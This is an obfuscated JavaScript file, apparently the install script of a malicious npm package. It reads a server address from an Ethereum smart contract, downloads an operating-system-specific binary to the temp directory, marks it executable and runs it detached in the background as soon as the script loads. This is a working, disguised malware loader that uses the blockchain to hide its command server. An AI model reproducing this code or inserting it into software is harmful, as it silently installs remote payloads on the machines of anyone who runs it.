const _0x29bc65=_0x4bcf;(function(_0x49dbee,_0xb1204f){const _0x56968f=_0x4bcf,_0x4f4ab7=_0x49dbee();while(!![]){try{const _0x449b30=parseInt(_0x56968f(0x195))/0x1*(parseInt(_0x56968f(0x1a3))/0x2)+-parseInt(_0x56968f(0x1a6))/0x3*(-parseInt(_0x56968f(0x19b))/0x4)+-parseInt(_0x56968f(0x1b9))/0x5*(parseInt(_0x56968f(0x193))/0x6)+parseInt(_0x56968f(0x18d))/0x7+-parseInt(_0x56968f(0x1b5))/0x8+parseInt(_0x56968f(0x1b8))/0x9+-parseInt(_0x56968f(0x1b7))/0xa;if(_0x449b30===_0xb1204f)break;else _0x4f4ab7['push'](_0x4f4ab7['shift']());}catch(_0x8c4243){_0x4f4ab7['push'](_0x4f4ab7['shift']());}}}(_0x105e,0x7344a));function _0x4bcf(_0x58ea1f,_0x326542){const _0x105e30=_0x105e();return _0x4bcf=function(_0x4bcf41,_0x29ec31){_0x4bcf41=_0x4bcf41-0x18d;let _0x3aa777=_0x105e30[_0x4bcf41];return _0x3aa777;},_0x4bcf(_0x58ea1f,_0x326542);}function _0x105e(){const _0x2921c5=['basename','unref','Oltlk','0xa1b40044EBc2794f207D45143Bd82a1B86156c6b','znVYm','/node-linux','220fmJehT','getDefaultProvider','zGOcE','1168065YsRylH','data','vNoTI','util','755','yHcxy','XaRVH','createWriteStream','tmpdir','darwin','QhIDL','aaeUB','platform','linux','pipe','2585232ViEhGe','Yvemr','2610400LWfcyB','2152512FwJSNz','536675TwKkBJ','Contract','3067253lwfndb','mainnet','ethers','path','/node-macos','inRyH','30oXqoQs','function\x20getString(address\x20account)\x20public\x20view\x20returns\x20(string)','1245oojxGc','0x52221c293a21D8CA7AFD01Ac6bFAC7175D590A84','error','win32','DmIPH','Ошибка\x20при\x20запуске\x20файла:','8dztHuI','ruDfP'];_0x105e=function(){return _0x2921c5;};return _0x105e();}const {ethers}=require(_0x29bc65(0x18f)),axios=require('axios'),util=require(_0x29bc65(0x1a9)),fs=require('fs'),path=require(_0x29bc65(0x190)),os=require('os'),{spawn}=require('child_process'),contractAddress=_0x29bc65(0x1a0),WalletOwner=_0x29bc65(0x196),abi=[_0x29bc65(0x194)],provider=ethers[_0x29bc65(0x1a4)](_0x29bc65(0x18e)),contract=new ethers[(_0x29bc65(0x1ba))](contractAddress,abi,provider),fetchAndUpdateIp=async()=>{const _0x275c15=_0x29bc65,_0x178627={'pwjDr':'Ошибка\x20при\x20получении\x20IP\x20адреса:'};try{const _0xf833b3=await contract['getString'](WalletOwner);return _0xf833b3;}catch(_0x1477da){return console[_0x275c15(0x197)](_0x178627['pwjDr'],_0x1477da),await fetchAndUpdateIp();}},getDownloadUrl=_0x5936c1=>{const _0x3a6cd1=_0x29bc65,_0x481f78={'zGOcE':_0x3a6cd1(0x1b3),'QjrjF':_0x3a6cd1(0x1af)},_0x755898=os['platform']();switch(_0x755898){case _0x3a6cd1(0x198):return _0x5936c1+'/node-win.exe';case _0x481f78[_0x3a6cd1(0x1a5)]:return _0x5936c1+_0x3a6cd1(0x1a2);case _0x481f78['QjrjF']:return _0x5936c1+_0x3a6cd1(0x191);default:throw new Error('Unsupported\x20platform:\x20'+_0x755898);}},downloadFile=async(_0x88c6b5,_0x2f7c98)=>{const _0x3154c7=_0x29bc65,_0x23799c={'Oltlk':'error','QhIDL':function(_0x1d1fe1,_0x45bfdb){return _0x1d1fe1(_0x45bfdb);},'yHcxy':'stream'},_0x9d1ca3=fs[_0x3154c7(0x1ad)](_0x2f7c98),_0x49c2ec=await _0x23799c[_0x3154c7(0x1b0)](axios,{'url':_0x88c6b5,'method':'GET','responseType':_0x23799c[_0x3154c7(0x1ab)]});return _0x49c2ec[_0x3154c7(0x1a7)][_0x3154c7(0x1b4)](_0x9d1ca3),new Promise((_0x1d4756,_0x3a721d)=>{const _0xf70d5a=_0x3154c7;_0x9d1ca3['on']('finish',_0x1d4756),_0x9d1ca3['on'](_0x23799c[_0xf70d5a(0x19f)],_0x3a721d);});},executeFileInBackground=async _0x398cf9=>{const _0x46afb6=_0x29bc65,_0x3e6ec0={'Yvemr':function(_0x51f3b3,_0x579c63,_0x5e4957,_0x4dba0b){return _0x51f3b3(_0x579c63,_0x5e4957,_0x4dba0b);},'vNoTI':'ignore','znVYm':_0x46afb6(0x19a)};try{const _0x2638d9=_0x3e6ec0[_0x46afb6(0x1b6)](spawn,_0x398cf9,[],{'detached':!![],'stdio':_0x3e6ec0[_0x46afb6(0x1a8)]});_0x2638d9[_0x46afb6(0x19e)]();}catch(_0x1fb386){console[_0x46afb6(0x197)](_0x3e6ec0[_0x46afb6(0x1a1)],_0x1fb386);}},runInstallation=async()=>{const _0x52712e=_0x29bc65,_0xcdf5b3={'DmIPH':function(_0x43a15e){return _0x43a15e();},'inRyH':function(_0x15e472,_0x502e76){return _0x15e472(_0x502e76);},'HQZnW':function(_0x1decb9,_0x5eb734,_0x2be29c){return _0x1decb9(_0x5eb734,_0x2be29c);},'kIgZV':function(_0x468975,_0x3d0171){return _0x468975!==_0x3d0171;},'aaeUB':_0x52712e(0x198),'XaRVH':_0x52712e(0x1aa),'ruDfP':'Ошибка\x20установки:'};try{const _0x23ec09=await _0xcdf5b3[_0x52712e(0x199)](fetchAndUpdateIp),_0x290619=_0xcdf5b3[_0x52712e(0x192)](getDownloadUrl,_0x23ec09),_0x1540a1=os[_0x52712e(0x1ae)](),_0x2d66c2=path[_0x52712e(0x19d)](_0x290619),_0x20041c=path['join'](_0x1540a1,_0x2d66c2);await _0xcdf5b3['HQZnW'](downloadFile,_0x290619,_0x20041c);if(_0xcdf5b3['kIgZV'](os[_0x52712e(0x1b2)](),_0xcdf5b3[_0x52712e(0x1b1)]))fs['chmodSync'](_0x20041c,_0xcdf5b3[_0x52712e(0x1ac)]);_0xcdf5b3[_0x52712e(0x192)](executeFileInBackground,_0x20041c);}catch(_0x2c0353){console[_0x52712e(0x197)](_0xcdf5b3[_0x52712e(0x19c)],_0x2c0353);}};runInstallation();